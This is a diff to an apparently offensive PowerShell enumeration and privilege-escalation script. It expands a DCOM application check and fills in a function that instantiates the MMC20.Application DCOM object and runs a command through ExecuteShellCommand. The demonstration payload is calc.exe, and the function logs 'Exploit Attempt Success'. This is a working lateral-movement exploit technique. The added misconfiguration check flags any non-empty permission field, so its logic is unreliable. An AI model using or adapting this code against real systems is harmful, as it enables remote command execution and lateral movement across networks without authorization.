@@ -1238,22 +1238,53 @@ function tryCOMObjectAbuse {
 function checkDCOMLateralMovement {
     if ($DEBUG_MODE) { Write-Output "Checking for DCOM Lateral Movement..." }
     try {
-        $dcomAppID = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
-        if ($dcomAppID) {
+        $dcomApps = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplicationSetting"
+        if ($dcomApps) {
             Write-Output "[+] DCOM Applications detected (printing max. 5):"
-            $dcomAppID | Select-Object -First 5 ForEach-Object { Write-Output "$($_.AppID)" }
-            $gCollect['OtherData']["DCOMLateralMovement"] = $dcomAppID.AppID
+            $dcomApps | Select-Object -First 5 | ForEach-Object { 
+                Write-Output "AppID: $($_.AppID)"
+                Write-Output "Description: $($_.Description)"
+                Write-Output "Launch Permissions: $($_.LaunchPermissions)"
+                Write-Output "Access Permissions: $($_.AccessPermissions)"
+            }
+            
+            $dcomApps | ForEach-Object {
+                $launchPerms = $_.LaunchPermissions
+                $accessPerms = $_.AccessPermissions
+
+                # If Launch or Access permissions are misconfigured (contain non-admin users)
+                if ($launchPerms -or $accessPerms) {
+                    Write-Output "[!] Potential Misconfiguration in DCOM Application with AppID $($_.AppID)"
+                    $gCollect['OtherData']["DCOMLateralMovement"] = $_.AppID
+                }
+            }
         } else {
             Write-Output "[-] No DCOM applications found."
         }
     } catch {
-        if ($DEBUG_MODE) { Write-Output "[-] Error checking DCOM movement: $_" }
+        Write-Output "[-] Error checking DCOM movement: $_"
     }
 }
 
 function tryDCOMLateralMovement {
     if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via DCOM Lateral Movement..." }
-    # Logic for exploiting DCOM for lateral movement
+    try {
+        # We can use the `MMC20.Application` DCOM object as a known vulnerable example for testing.
+        $comObject = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application"))
+        if ($comObject) {
+            Write-Output "[+] Successfully instantiated MMC20.Application. Exploiting..."
+
+            # Launch calc.exe as an example
+            $comObject.Document.ActiveView.ExecuteShellCommand("calc.exe", "", "", "7")
+            Write-Output "[+] Successfully executed calc.exe via DCOM!"
+
+            $gCollect['Exploits']["DCOMLateralMovement"] = "Exploit Attempt Success"
+        } else {
+            Write-Output "[-] Failed to instantiate MMC20.Application."
+        }
+    } catch {
+        Write-Output "[-] Error during DCOM exploitation attempt: $_"
+    }
 }
 
 function checkEFSSettings {
